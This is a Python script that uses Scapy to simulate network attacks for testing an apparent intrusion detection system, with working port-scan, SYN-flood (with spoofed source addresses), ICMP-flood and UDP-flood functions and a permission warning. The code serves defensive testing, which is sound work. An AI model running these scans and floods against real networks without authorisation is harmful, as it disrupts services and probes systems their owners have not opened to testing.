"""
simulate_attacks.py — Generate synthetic attack traffic to test the IDS
Run this alongside server.py (in demo mode) or on a test network.

Usage:
    python simulate_attacks.py --target 127.0.0.1
    python simulate_attacks.py --attack port_scan --target 192.168.1.1
    python simulate_attacks.py --attack syn_flood --target 192.168.1.1
    python simulate_attacks.py --attack icmp_flood --target 192.168.1.1
    python simulate_attacks.py --attack all --target 192.168.1.1

WARNING: Only run on networks you own or have explicit permission to test.
"""

import sys
import time
import random
import argparse

try:
    from scapy.all import (
        IP, TCP, UDP, ICMP, send, RandShort, conf
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


def port_scan(target: str, ports=range(1, 1025), delay=0.001):
    print(f"[*] Starting port scan against {target} ({len(ports)} ports)…")
    for port in ports:
        pkt = IP(dst=target) / TCP(dport=port, flags='S')
        send(pkt, verbose=False)
        time.sleep(delay)
    print("[*] Port scan complete.")


def syn_flood(target: str, port: int = 80, count: int = 500, delay=0.001):
    print(f"[*] SYN flooding {target}:{port} with {count} packets…")
    for _ in range(count):
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}." \
                 f"{random.randint(1,254)}.{random.randint(1,254)}"
        pkt = IP(src=src_ip, dst=target) / TCP(sport=RandShort(),
                                                dport=port, flags='S')
        send(pkt, verbose=False)
        time.sleep(delay)
    print("[*] SYN flood complete.")


def icmp_flood(target: str, count: int = 200, delay=0.002):
    print(f"[*] ICMP flooding {target} with {count} pings…")
    for _ in range(count):
        pkt = IP(dst=target) / ICMP()
        send(pkt, verbose=False)
        time.sleep(delay)
    print("[*] ICMP flood complete.")


def udp_flood(target: str, port: int = 53, count: int = 300, delay=0.001):
    print(f"[*] UDP flooding {target}:{port} with {count} packets…")
    for _ in range(count):
        pkt = IP(dst=target) / UDP(dport=port) / (b'X' * random.randint(10, 100))
        send(pkt, verbose=False)
        time.sleep(delay)
    print("[*] UDP flood complete.")


def main():
    ap = argparse.ArgumentParser(description='IDS Attack Simulator')
    ap.add_argument('--target', default='127.0.0.1')
    ap.add_argument('--attack',
                    choices=['port_scan', 'syn_flood', 'icmp_flood',
                             'udp_flood', 'all'],
                    default='all')
    args = ap.parse_args()

    if not SCAPY_AVAILABLE:
        print("[!] Scapy is not installed. Install with: pip install scapy")
        sys.exit(1)

    print(f"\n{'='*50}")
    print(f"  IDS Attack Simulator")
    print(f"  Target : {args.target}")
    print(f"  Attack : {args.attack}")
    print(f"{'='*50}\n")
    print("  WARNING: Only run on networks you own or have explicit permission to test.\n")

    if args.attack in ('port_scan', 'all'):
        port_scan(args.target, range(1, 200))
        time.sleep(1)

    if args.attack in ('syn_flood', 'all'):
        syn_flood(args.target, port=80, count=200)
        time.sleep(1)

    if args.attack in ('icmp_flood', 'all'):
        icmp_flood(args.target, count=100)
        time.sleep(1)

    if args.attack in ('udp_flood', 'all'):
        udp_flood(args.target, count=200)

    print("\n[✓] All attacks complete. Check the IDS dashboard for alerts.")


if __name__ == '__main__':
    main()